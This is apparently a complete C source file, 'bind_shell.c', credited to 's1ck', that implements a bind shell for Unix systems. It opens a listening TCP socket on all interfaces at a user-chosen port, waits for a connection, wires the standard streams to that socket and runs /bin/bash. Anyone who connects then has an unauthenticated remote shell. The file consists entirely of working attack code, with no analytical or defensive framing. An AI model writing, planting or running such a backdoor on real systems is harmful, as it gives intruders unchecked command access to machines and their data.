/*
bind_shell.c

Author: s1ck

Description: simple bind shell for unix based environments.

extra: uses TCP+Ipv4 connection

*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <netinet/in.h>


void error(char* msg){
    perror(msg);
    _exit(1);
}

int main(int argc, char* argv[]){

    int server_fd,client_fd,port,n;
    struct sockaddr_in server_addr;
    char buffer[256];

    if (argc<2){
        fprintf(stderr,"usage: %s port\n",argv[0]);
        _exit(0);
    }

    server_fd = socket(AF_INET,SOCK_STREAM,0);

    if (server_fd < 0){
        error("ERROR opening socket");
    }

    bzero((char *)&server_addr, sizeof(server_addr));

    port = atoi(argv[1]);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = INADDR_ANY; // 0.0.0.0

    if (bind(server_fd,(struct sockaddr*)&server_addr,sizeof(server_addr))<0){
        error("ERROR on bind");
    }

    listen(server_fd,0);


    client_fd = accept(server_fd,NULL,NULL);

    if (client_fd < 0){
        error("ERROR on accept");
    }


    write(client_fd,"serving shell!...\n",18);


    // changin stdin, stdout and stderr to point to the connection

    dup2(client_fd,0);
    dup2(client_fd,1);
    dup2(client_fd,2);


    execve("/bin/bash",NULL,NULL);


    return 0;
}
